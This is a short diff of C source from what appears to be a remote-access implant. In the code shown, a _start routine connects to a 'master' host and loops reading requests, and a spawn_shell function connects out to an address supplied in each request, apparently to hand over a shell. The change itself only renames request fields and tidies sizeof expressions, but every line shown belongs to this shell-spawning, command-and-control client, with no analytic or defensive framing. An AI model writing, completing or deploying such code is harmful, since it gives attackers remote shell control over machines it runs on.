@@ -59,10 +59,10 @@ spawn_shell(union client_request* req) {
     goto early_fail;
 
   addr.sin_family = AF_INET;
-  addr.sin_addr.s_addr = req->client_ip;
-  addr.sin_port = req->client_port;
+  addr.sin_addr.s_addr = req->connect_ip;
+  addr.sin_port = req->connect_port;
 
-  rc = connect(client_fd, &addr, sizeof(struct sockaddr_in));
+  rc = connect(client_fd, &addr, sizeof(addr));
   if (rc < 0)
     goto connect_fail;
 
@@ -105,13 +105,13 @@ _start(void) {
   if (rc < 0)
     goto early_fail;
 
-  rc = connect(master_fd, &master_addr, sizeof(struct sockaddr_in));
+  rc = connect(master_fd, &master_addr, sizeof(master_addr));
   if (rc < 0)
     goto connect_fail;
 
   while (1) {
-    rc = read(master_fd, &req, sizeof(union client_request));
-    if (rc != sizeof(union client_request))
+    rc = read(master_fd, &req, sizeof(req));
+    if (rc != sizeof(req))
       success = 0;
     else
       success = 1;
